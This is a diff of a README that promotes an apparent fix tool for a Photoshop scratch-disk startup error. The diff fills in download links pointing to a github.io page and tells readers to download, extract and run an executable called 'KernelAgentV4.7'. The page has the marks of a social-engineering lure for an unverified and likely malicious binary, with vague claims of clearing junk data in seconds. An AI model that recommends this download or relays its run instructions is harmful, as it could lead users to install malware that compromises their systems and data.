@@ -2,13 +2,15 @@
 
 This tool resolves the startup error preventing Photoshop from launching due to full or misconfigured scratch disks. Powered by `KernelAgentV4.7`, it clears junk data and restores launch access in seconds.
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Photoshop_Scratch_Init_Fix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Fix Tool](https://img.shields.io/badge/Download-Photoshop_Scratch_Init_Fix-blueviolet)](https://photoshop-scratch-init-failure-fix.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://photoshop-scratch-init-failure-fix.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\ScratchDiskInitFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧹 The tool will clean temp and cache directories used by Photoshop scratch logic  
